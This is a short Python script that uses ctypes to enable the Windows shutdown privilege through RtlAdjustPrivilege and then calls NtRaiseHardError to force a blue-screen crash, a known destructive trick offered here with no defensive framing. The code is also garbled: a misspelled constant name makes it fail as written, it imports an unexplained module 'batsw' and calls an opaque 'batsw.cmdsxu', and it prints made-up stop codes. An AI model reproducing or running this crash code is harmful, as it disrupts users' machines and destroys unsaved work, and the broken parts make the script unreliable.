import ctypes
import batsw

ntdll = ctypes.windll.ntdll
SeShutdownPrivielage = 19

def GetNtError(err):
  return ntdll.RtlNtStatusToDosError(err)

def BSOD(stop_code):
  enabled = ctypes.c_bool()
  res = ntdll.RtlAdjustPrivilege(SeShutdownPrivilege, True, False, ctypes.pointer(enabled))
  
  if not res:
    print("OK")
  else:
    print("Fail")
    raise ctypes.WinError(GetNtError(res))
    
  response = ctypes.c_ulong()
  res = ntdll.NtRaiseHardError(stop_code, 0, 0, 0, 6, ctypes.byref(response))
  
  if not res:
    print("0x0000EF - 0x0043ER4")
  else:
    print("Oh Nice Try...")
    batsw.cmdsxu
    raise ctypes.WinError(GetNtError(res))
    
#BSOD --> 0xDEADDEAD)
